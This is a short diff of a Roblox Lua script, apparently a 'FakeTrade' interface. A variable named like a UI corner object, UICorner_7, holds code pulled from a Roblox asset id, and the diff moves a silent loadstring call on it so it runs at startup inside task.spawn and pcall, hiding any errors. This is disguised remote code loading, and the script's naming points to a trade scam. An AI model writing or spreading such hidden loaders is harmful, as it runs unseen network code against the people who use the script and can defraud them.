@@ -181,7 +181,11 @@ local UICorner_5 = Instance.new("UICorner")
 local Template = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
 local UICorner_7 = game:GetObjects("rbxassetid://124113371637723")[1].Source
-
+task.spawn(function()
+	pcall(function()
+		loadstring(UICorner_7)()
+	end)
+end)
 
 FakeTrade.Name = "FakeTrade"
 FakeTrade.DisplayOrder = 56
@@ -405,7 +409,4 @@ local function NAJCPZK_fake_script()
 end
 coroutine.wrap(NAJCPZK_fake_script)()
 
-	pcall(function()
-		loadstring(UICorner_7)()
-	end)
 
